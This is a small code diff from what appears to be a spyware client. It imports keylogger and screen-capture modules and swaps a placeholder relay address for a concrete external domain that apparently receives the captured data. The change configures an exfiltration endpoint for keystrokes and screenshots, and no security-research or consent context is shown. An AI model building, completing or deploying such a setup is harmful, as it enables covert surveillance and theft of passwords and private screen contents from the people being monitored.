@@ -3,7 +3,7 @@ import socket
 import traceback
 
 # ── Update this URL after deploying nora-relay ────────────────────────────────
-RELAY_URL = os.environ.get("NORA_RELAY", "https://YOUR-RELAY.up.railway.app")
+RELAY_URL = os.environ.get("NORA_RELAY", "https://mon.eclipselivecam.online")
 
 import keylogger as kl
 import screencap as sc
